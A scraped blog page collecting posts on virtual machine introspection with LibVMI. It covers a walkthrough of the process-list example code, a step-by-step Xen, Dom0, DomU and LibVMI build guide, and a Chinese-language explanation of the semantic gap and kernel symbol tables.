<p>Before we do the vmi, we need to pause the vm for consistent memory access, then we can read memory from guest memory:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* get the head of the list */</span></div><div class="line"><span class="keyword">if</span> (VMI_OS_LINUX == vmi_get_ostype(vmi)) &#123;</div><div class="line">    current_process = vmi_translate_ksym2v(vmi, <span class="string">"init_task"</span>);</div><div class="line">&#125;</div><div class="line">...</div><div class="line"><span class="comment">/* walk the task list */</span></div><div class="line">list_head = current_process + tasks_offset;</div><div class="line">current_list_entry = list_head;</div><div class="line"></div><div class="line">status = vmi_read_addr_va(vmi, current_list_entry, <span class="number">0</span>, &amp;next_list_entry);</div><div class="line"><span class="keyword">if</span> (status == VMI_FAILURE) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to read next pointer at 0x%lx before entering loop\n"</span>,</div><div class="line">            current_list_entry);</div><div class="line">    <span class="keyword">goto</span> error_exit;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>We firstly get the head of the task_struct list <code>current_process</code>, then use <code>vmi_read_addr_va</code> to read the memory in address <code>current_list_entry</code>, which is the address of <code>next_list_entry</code>.</p>
<p>Here <code>vmi_read_addr_va</code> is similar with following <code>vmi_read_32_va</code>, <code>vmi_read_str_va</code> and so on. These lib functions take the virtual address (<code>vaddr</code>) as one of there parameters, they firstly walk the page table with cr3 and get physical address (<code>paddr</code>), then they use the libxenctrl to map a memory page of that paddr, which return back the virtual address (<code>memory</code>) seen by Dom0, with the <code>memory</code>, they can use <code>memcpy</code> to copy the corresponding size of memory to the <code>buf</code>.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">do</span> &#123;</div><div class="line">    vmi_read_32_va(vmi, current_process + pid_offset, <span class="number">0</span>, &amp;pid);</div><div class="line">    procname = vmi_read_str_va(vmi, current_process + name_offset, <span class="number">0</span>);</div><div class="line">    <span class="keyword">if</span> (procname) &#123;</div><div class="line">        <span class="built_in">free</span>(procname);</div><div class="line">        procname = <span class="literal">NULL</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    current_list_entry = next_list_entry;</div><div class="line">    current_process = current_list_entry - tasks_offset;</div><div class="line"></div><div class="line">    <span class="comment">/* follow the next pointer */</span></div><div class="line">    status = vmi_read_addr_va(vmi, current_list_entry, <span class="number">0</span>, &amp;next_list_entry);</div><div class="line">    <span class="keyword">if</span> (status == VMI_FAILURE) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to read next pointer in loop at %lx\n"</span>, current_list_entry);</div><div class="line">        <span class="keyword">goto</span> error_exit;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; <span class="keyword">while</span> (next_list_entry != list_head);</div></pre></td></tr></table></figure></p>
<p>This is the main loop of process vmi: it uses <code>vmi_read_32_va</code> to read pid (<code>pid_offset</code>) of each process, use <code>vmi_read_str_va</code> to read name (<code>name_offset</code>) of each process, and at last use <code>vmi_read_addr_va</code> to read the next entry of tast_struct in the list.</p>
<p>Finally we should never forget to resume the guest vm and destroy the vmi environment:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* resume the vm */</span></div><div class="line">vmi_resume_vm(vmi);</div><div class="line"></div><div class="line"><span class="comment">/* cleanup any memory associated with the LibVMI instance */</span></div><div class="line">vmi_destroy(vmi);</div></pre></td></tr></table></figure></p>
<p>We can compile and run the vmi tool in the root directory of libvmi:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ make</div><div class="line">$ sudo ./examples/process-<span class="built_in">list</span> vm_name</div></pre></td></tr></table></figure></p>
<p>If you want to write your own vmi tools, you can imitate the <code>process-list</code> to write a new one (e.g. my_vmi_tool.c). After that, you need to modify the <code>examples/Makefile.am</code> file:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">bin_PROGRAMS = ... my_vmi_tool</div><div class="line">...</div><div class="line">my_vmi_tool_SOURCES = my_vmi_tool.c</div></pre></td></tr></table></figure></p>
<p>Actually after we run <code>make</code> in the root directory of libvmi, the <code>Makefile</code> in <code>examples/</code>directory will generate a new executable file called <code>my_vmi_tool</code>, which is a script file to invoke the actual code in your <code>my_vmi_tool.c</code>.</p>
<hr>
<p>Last thing you should know is: currently vmi tool are all user mode application code. It does not support to write vmi tool as a kernel module. The environment you vmi code run is just the user space on the host OS.</p>
<p>Whenever you have any problem with libvmi, you can create a post in their <a href="https://groups.google.com/forum/#!forum/vmitools" target="_blank" rel="external">googlegroup</a>. The guys there are really very friendly, I’ve post 2 topics there and both receive very good feedbacks.</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmiintrospection/" target="_blank" rel="external">Libvmi Setup</a>》</p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/虚拟机监控/">虚拟机监控</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-libvmisetup"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170102/libvmisetup/">Libvmi setup</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170102/libvmisetup/" class="article-date">
	  <time datetime="2017-01-02T02:54:50.000Z" itemprop="datePublished">一月 2, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者：<a href="http://ytliu.info/blog/2013/08/04/libvmi-setup/" target="_blank" rel="external">ytliu</a><br>编辑：@图拉</p>
<hr>
<p><strong>CSysSec注</strong>： 继<a href="http://www.csyssec.org/20170102/libvmiintro/" target="_blank" rel="external">上一篇</a>文章介绍Libvmi后，这篇主要介绍如何搭建Libvmi。作者ytliu，来自上海交通大学PhD,研究方向是虚拟化与系统安全，在顶会CCS，HPCA等发表多篇文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmisetup/" target="_blank" rel="external">Libvmi Setup</a>》</p>
<hr>
<blockquote>
<ul>
<li>0X01 Xen install</li>
<li>0X02 Domain 0 install</li>
<li>0X03 Domain U setup</li>
<li>0X04 libvmi setup</li>
</ul>
</blockquote>
<hr>
<p>These days I was busy leanrning and trying one of the famous Virtual Machine Introspection (VMI) framework —— <a href="https://github.com/libvmi/libvmi" target="_blank" rel="external">libvmi</a>, it is a library which provides lots of serviceable APIs for programmer to develop introspection tools.</p>
<p>As we know, one of the foremost problems of VMI is bridging semantics gap between protected and security VMs, libvmi provides APIs helping you to access the memory of a running virtual machine, more specifically, it provides primatives for accessing this memory using physical or virtual addresses and kernel symbols. I will discuss about that in the coming blog introducing libvmi usage.</p>
<p>Now it’s the main topic of this blog: how to setup libvmi?</p>
<p>Since libvmi currently support Xen and KVM, and Xen is my preference, following I will take xen as example platform.</p>
<h3 id="0X01-Xen-install"><a href="#0X01-Xen-install" class="headerlink" title="0X01 Xen install"></a>0X01 Xen install</h3><p>Before setup libvmi, we need to install Xen first:</p>
<p>One of the most straight forward way to install xen is using Debian’s aptitude:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install xen-linux-system<span class="number">-2.6</span> libc6-xen bridge-utils xen-tools</div></pre></td></tr></table></figure></p>
<p>However, I cannot compile libvmi successfully in such environment, and after seeking in libvmi’s group solution, I need to compile xen from source code. Before that, I need to uninstall the previous installed xen environment:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$sudo dpkg -l | grep xen</div><div class="line">purge them except Dom0 kernel:</div><div class="line">$ sudo dpkg -P libxenstore3<span class="number">.0</span></div><div class="line">…</div></pre></td></tr></table></figure></p>
<p>Then download the latest 4.3.0 source tarball from <a href="https://www.xenproject.org" target="_blank" rel="external">xen.org</a> and do the usual:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ make xen</div><div class="line">$ ./configure</div></pre></td></tr></table></figure></p>
<p>Error: unable to find xgettext, please install xgettext<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install gettext</div></pre></td></tr></table></figure></p>
<p>Error: unable to find as86, please install as86<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install bcc</div></pre></td></tr></table></figure></p>
<p>Error: unable to find iasl, please install iasl<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install sail</div></pre></td></tr></table></figure></p>
<p>Error: unable to find a uuid library<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install uuid-dev</div></pre></td></tr></table></figure></p>
<p>Error: unable to find yawl, please install yajl<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install libyajl-dev</div><div class="line">$ sudo aptitude install libpixman<span class="number">-1.</span>dev</div></pre></td></tr></table></figure></p>
<p>After install all these pre-required library:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ make tools    </div><div class="line">$ make stubdom</div><div class="line">$ sudo make install-xen</div><div class="line">$ sudo make install-tools PYTHON_PREFIX_ARG=</div><div class="line">$ sudo make install-stubdom</div></pre></td></tr></table></figure></p>
<p>Then Xen is successfully compiled.</p>
<h3 id="0x02-Domain-0-install"><a href="#0x02-Domain-0-install" class="headerlink" title="0x02 Domain 0 install"></a>0x02 Domain 0 install</h3><p>After xen is installed, we need to compile the domain 0 ourselves.</p>
<p>I download the latest linux kernel (here is 3.10.3) from <a href="https://www.kernel.org" target="_blank" rel="external">kernel.org</a>, then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ make menuconfig</div></pre></td></tr></table></figure></p>
<p>in the menuconfig, I choose the virtualization config options and some required device driver (specifically the SATA and SCSI ones), and then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ make -j4</div><div class="line">$ make modules</div><div class="line">$ make modules_install</div><div class="line">$ sudo make install</div></pre></td></tr></table></figure></p>
<p>Then domain 0 is also successfully compiled, and after we use<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ update-grub</div></pre></td></tr></table></figure></p>
<p>the <code>grub.cfg</code> file in<code>/boot/grub/</code> will traverse the <code>/boot/</code> directory and fill all choiceable Xen and kernel image in the grub config during booting.</p>
<p>Here I did not create the initrd of the kernel, because I’ve already compiled the essential driver in my kernel.</p>
<h3 id="0x03-Domain-U-setup"><a href="#0x03-Domain-U-setup" class="headerlink" title="0x03 Domain U setup"></a>0x03 Domain U setup</h3><p>After the above done, we reboot, and enter into the Xen environment we just compiled, and are ready to setup our DomU.</p>
<p>For our HVM DomU setup, we first need to provide a ISO image for DomU install —— <code>ubuntu.iso</code>, and<code>dd</code> for a 10G image:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ dd <span class="keyword">if</span>=/dev/zero of=ubuntu.img bs=<span class="number">1000</span> count=<span class="number">0</span> seek=$[<span class="number">1000</span>*<span class="number">1000</span>*<span class="number">10</span>]</div></pre></td></tr></table></figure></p>
<p>Then edit our HVM config file:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">kernel = "hvmloader"</div><div class="line">builder='hvm'</div><div class="line">memory = 2048</div><div class="line">name = "ubuntu"</div><div class="line">vif = [ 'bridge=xenbr0' ]</div><div class="line">disk = [ 'file:diretory-to-domu/ubuntu.img,hda,w', 'file:diretory-to-domu/ubuntu.iso,hdc:cdrom,r' ]</div><div class="line">sdl=0</div><div class="line">opengl=1</div><div class="line">vnc=1</div><div class="line">vncpasswd=''</div><div class="line">stdvga=0</div><div class="line">serial='pty'</div><div class="line">tsc_mode=0</div></pre></td></tr></table></figure></p>
<p>Then in the terminal, run following command:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo xm create ubuntu.hvm</div></pre></td></tr></table></figure></p>
<p>After that, we can connect to our DomU using vnc:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ gvncviewer localhost</div></pre></td></tr></table></figure></p>
<h3 id="0x04-libvmi-setup"><a href="#0x04-libvmi-setup" class="headerlink" title="0x04 libvmi setup"></a>0x04 libvmi setup</h3><p>After all the above environment is ready, we can now compile our libvmi and try to use some of its examples:</p>
<p>We first download the source code from <a href="https://github.com/libvmi/libvmi" target="_blank" rel="external">here</a>, and <code>cd</code> enter it,<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./autogen.sh</div></pre></td></tr></table></figure></p>
<p>Error: could not find libtoolize or glibtoolize<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install libtool</div></pre></td></tr></table></figure></p>
<p>Error: aclocal not found<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install automake autoconf</div></pre></td></tr></table></figure></p>
<p>Then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure</div></pre></td></tr></table></figure></p>
<p>Error: Package requirements (glib-2.0 &gt;= 2.16) were not met<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install libglib2<span class="number">.0</span>-dev</div></pre></td></tr></table></figure></p>
<p>Error: Package requirements (check &gt;= 0.9.4) are not met:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install check</div></pre></td></tr></table></figure></p>
<p>Then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ make</div><div class="line">$ sudo ldconfig</div><div class="line">$ <span class="function">sudo make <span class="title">install</span>  <span class="params">(optional)</span></span></div></pre></td></tr></table></figure></p>
<p>Actually, after we successfully <code>make</code>, we can already use it. Before that, we firstly need to provide a config file: <code>/etc/libvmi.conf</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ubuntu &#123;</div><div class="line">    sysmap      = <span class="string">"directory-to-sysmap/System.map-3.5.0-23-generic"</span>;</div><div class="line">    ostype      = <span class="string">"Linux"</span>;</div><div class="line">    linux_tasks = <span class="number">0x240</span>;</div><div class="line">    linux_name  = <span class="number">0x460</span>;</div><div class="line">    linux_mm    = <span class="number">0x278</span>;</div><div class="line">    linux_pid   = <span class="number">0x2b4</span>;</div><div class="line">    linux_pgd   = <span class="number">0x48</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>These options are:</p>
<p><figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi%20Setup.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi%20Setup.png" width="450"></a><br>    <figcaption></figcaption><br></figure><br>Also, libvmi provide a tool in <code>libvmi/tools/linux-offset-finder/</code>, you can copy this directory to the DomU, compile it, and then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo insmod findoffsets.ko</div></pre></td></tr></table></figure></p>
<p>then, look the log of the system:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ dmesg</div></pre></td></tr></table></figure></p>
<p>to get these offsets automatically.</p>
<p>Meanwhile, libvmi provide some straight forward examples, like<code>process-list</code>, <code>dump-memory</code>, etc., and we can use them (process-list as example):<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo ./examples/process-<span class="built_in">list</span> ubuntu</div></pre></td></tr></table></figure></p>
<p>Here <code>ubuntu</code>means the name of the DomU, the same as shown when we run:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo xm <span class="built_in">list</span></div></pre></td></tr></table></figure></p>
<p>Then it will list all of the processes running in the ubuntu DomU.</p>
<hr>
<p>Other usages of libvmi, as well as how to write our own introspection tools is introduced <a href="http://ytliu.info/blog/2013/08/14/write-introspection-tools-using-libvmi/" target="_blank" rel="external">here</a>.</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmisetup/" target="_blank" rel="external">Libvmi Setup</a>》</p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/虚拟机监控/">虚拟机监控</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-libvmiintro"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170102/libvmiintro/">Libvmi原理</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170102/libvmiintro/" class="article-date">
	  <time datetime="2017-01-02T02:40:14.000Z" itemprop="datePublished">一月 2, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者：<a href="http://yandong.org/?p=278#more-278" target="_blank" rel="external">yandong</a><br>编辑： @Tula</p>
<hr>
<p><strong>CSysSec注</strong>： Libvmi是佐治亚理工大学PhD毕业生Bryan Payne写的一套从外部监控虚拟机内部行为的API框架，更多详细信息可以见其主页： <a href="http://libvmi.com/" target="_blank" rel="external">libvmi</a><br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmiintro/" target="_blank" rel="external">Libvmi原理</a>》与作者信息：<a href="http://yandong.org/?p=278#more-278" target="_blank" rel="external">yandong</a></p>
<hr>
<blockquote>
<ul>
<li>0X00 Libvmi简介</li>
<li>0X01 语义鸿沟</li>
<li>0X02 Libvmi的使用区别</li>
<li>0X03 内核结构体的遍历</li>
<li>0X04 符号表</li>
</ul>
</blockquote>
<h3 id="0x00-Libvmi简介"><a href="#0x00-Libvmi简介" class="headerlink" title="0x00 Libvmi简介"></a>0x00 Libvmi简介</h3><p>Libvmi是一个能够访问正在运行中的虚拟机底层信息的函数库，这些信息包括虚拟机内存信息、寄存器信息以及一些硬件支持拦截的事件。Libvmi最大贡献在于使得虚拟机自省更加方便。Libvmi可以支持Xen、KVM和QEMU等虚拟化平台。其主要部署在宿主操作系统或者特权虚拟机上，可以支持Windows和linux等主流操作系统，并且可以与著名取证工具Volatility协作。</p>
<p>Libvmi是从XenAccess项目发展而来，其主要的处理流程如下所述。首先，自省程序需要获取内核的符号信息。然后，Libvmi需要找到内核符号的虚拟地址。接着，Libvmi需要根据内核页目录、页表等找到正确的数据页，并把对应虚拟内存地址上的数据返回给自省程序。而且，凭借着多级缓存技术，Libvmi能够快速的访问虚拟机的内存，从而极大的提升自省工具的性能。</p>
<h3 id="0x01-语义鸿沟"><a href="#0x01-语义鸿沟" class="headerlink" title="0x01 语义鸿沟"></a>0x01 语义鸿沟</h3><p>语义鸿沟问题是虚拟机自省的一大难点，同时也是使用Libvmi进行监控的难点，Libvmi提供的只是访问虚拟机内存的功能而已。如下图所示，在虚拟化架构中，我们可以从虚拟机管理器(VMM)从获取虚拟机的信息，并且具有很好的透明性和隔离性。</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi01.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi01.png" width="450"></a><br>    <figcaption></figcaption><br></figure>


<p>但是，从虚拟机管理器层所看到的虚拟机的信息都是0和1等低层次的二进制信息，但是我们又期望能获取想进程列表等高层语义信息，这之间的差别就是语义鸿沟</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi02.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi02.png" width="450"></a><br>    <figcaption></figcaption><br></figure>


<p>解决语义鸿沟需要具备以下两个条件：</p>
<p>(1)能够访问虚拟机的内存 (libvmi)</p>
<p>(2)拥有丰富的符号表信息 (结构体之间的关系，结构体的详细定义，结构体中各变量的偏移，长度等等。如常用的进程，文件，端口等信息)</p>
<h3 id="0x02-Libvmi的使用区别"><a href="#0x02-Libvmi的使用区别" class="headerlink" title="0x02 Libvmi的使用区别"></a>0x02 Libvmi的使用区别</h3><p><strong>(1)正常方式：</strong></p>
<p>使用“-&gt;”操作符引用结构体中的变量。</p>
<p><strong>(2)VMI方式：</strong></p>
<p>需要先计算结构体的起始地址加上变量相对于结构体的偏移地址，再使用读内存函数(Read)读取该变量的值。</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi03.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi03.png" width="450"></a><br>    <figcaption></figcaption><br></figure>


<h3 id="0x03-内核结构体的遍历"><a href="#0x03-内核结构体的遍历" class="headerlink" title="0x03 内核结构体的遍历"></a>0x03 内核结构体的遍历</h3><p>归根到底，使用libvmi获取信息，需要知道对内核结构体有足够的了解。如下图，分别为如何获取进程列表和文件信息。</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi04.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi04.png" width="450"></a><br>    <figcaption></figcaption><br></figure>

<p><figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi05.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi05.png" width="450"></a><br>    <figcaption></figcaption><br></figure></p>
<h3 id="0x04-符号表"><a href="#0x04-符号表" class="headerlink" title="0x04 符号表"></a>0x04 符号表</h3><p>   符号表就是在虚拟机内部函数或者变量中可供引用的函数或者变量符号表。通过内核符号表，我们便可以知道内核中结构体的组成、变量的偏移地址等等信息。对于普通的内核模块，我们可以直接使用一些全局的变量或者使用“-&gt;”操<br>作符来引用结构体中元素。但对于部署在虚拟机外部的虚拟机自省工具而言，其无法享受这种便利，而只能根据预先计算的起始地址加上变量的偏移来读写变量。因<br>而，符号表对于虚拟机自省而言至关重要，是解决语义鸿沟问题的重要工具。而除了虚拟机自省，取证和调试等其他领域也需要符号表。</p>
<p> 对于Windows系统，Microsoft提供了完善的符号表信息，其中包括xp、vista和Windows<br>7等等不同的版本，以及32位和64位不同的架构。著名的取证工具Volatility中便带有完整的各个版本和架构的Windows符号信息。</p>
<p>对于Linux，目前有三种获取符号信息的方式。</p>
<p>(1)首先，我们可以从System.map文件中获取符号信息，如init_task进程结构体的起始地址，但是其包含的信息有限。</p>
<p>(2)其次，可以通过编写简单的内核模块来计算结构体的组成及其中各元素的偏移，如Libvmi便使用这种方法来获取一些符号信息。这种方法的缺点是不适合获取较为完整或者大量的信息，因为那将导致极大的工作量。</p>
<p>(3)另外一种方法是利用ELF文件中调试信息，如DWARF格式。DWARF的全称是“Debugging<br>With Attributed Record Formats”，遵从GNU<br>FDL授权，是一种调试信息的存储格式。如果在编译阶段加入调试参数，编译器会从源文件中收集变量名、函数名、变量和函数类型，<br>以及相应的行号等信息，并遵循特定的格式规范将这些信息存储懂到文件中。之后，在进行调试的时，调试器能够解析这种格式从而获得变量、函数等相关信息。而DWARF提了一个非常通用的方案来描述如何定位由一个变量代表的数据，从而为调试、取证以及虚拟机自省提供了方便。如Volatility便是利用DWARF技术来获取所需的Linux的符号信息。</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmiintro/" target="_blank" rel="external">Libvmi原理</a>》与作者信息：<a href="http://yandong.org/?p=278#more-278" target="_blank" rel="external">yandong</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/虚拟机监控/">虚拟机监控</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-memorysafety-defense"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170101/memorysafety-defense/">内存持久战之防御措施</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170101/memorysafety-defense/" class="article-date">
	  <time datetime="2017-01-01T04:31:03.000Z" itemprop="datePublished">一月 1, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本系列文章来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/02/24/memorywar-defense/" target="_blank" rel="external">个人博客</a>，主要介绍内存的安全性问题，以及相应的攻击模型及防御措施，对整个系统安全问题的概览有很大的帮助。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/memorysafety-defense/" target="_blank" rel="external">内存持久战之防御措施</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
<hr>
<blockquote>
<ul>
<li>0X01 广泛部署的防御机制</li>
<li>0X02 防御机制Step-by-step </li>
</ul>
</blockquote>
